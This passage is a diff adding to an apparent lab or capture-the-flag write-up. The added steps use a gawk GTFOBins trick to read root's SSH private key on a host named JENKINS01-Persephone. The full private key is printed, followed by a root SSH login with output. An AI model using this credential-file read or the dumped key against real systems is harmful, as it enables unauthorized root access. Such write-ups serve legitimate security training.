@@ -106,4 +106,93 @@ bash: cannot set terminal process group (997): Inappropriate ioctl for device
 bash: no job control in this shell
 lucian@JENKINS01-Persephone:~$ 
 ```
+After loading linpeas we see gawk 
+
+https://gtfobins.github.io/gtfobins/gawk/
+
+I went through the list and I can't run sudo without the pass word and lets see if we can use the read file
+```
+gawk '//' "$LFILE"
+```
+```
+gawk '//' /root/.ssh/id_rs
+```
+## id_rsa
+```
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+
+```
+```
+❯ chmod 600 id_rsa
+❯ ssh -i id_rsa root@10.10.110.102
+The authenticity of host '10.10.110.102 (10.10.110.102)' can't be established.
+ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:11: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? y
+Please type 'yes', 'no' or the fingerprint: yes
+Warning: Permanently added '10.10.110.102' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-41-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Apr 14 03:57:44 PM UTC 2023
+
+  System load:  0.0               Processes:               212
+  Usage of /:   89.4% of 4.58GB   Users logged in:         0
+  Memory usage: 22%               IPv4 address for ens160: 192.168.1.102
+  Swap usage:   0%
+
+  => / is using 89.4% of 4.58GB
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Sat Jul 23 05:29:26 2022
+root@JENKINS01-Persephone:~# 
+```
+
 
